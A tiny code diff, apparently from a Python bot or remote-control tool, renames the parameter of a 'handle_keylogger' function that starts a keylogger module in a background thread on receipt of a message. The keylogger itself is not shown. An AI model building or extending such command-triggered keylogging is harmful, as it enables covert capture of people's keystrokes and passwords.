@@ -1,7 +1,7 @@
 import threading
 import keylogger
 
-def handle_keylogger(message):
+def handle_keylogger(_):
     try:
         t = threading.Thread(target=keylogger.main)
         t.start()
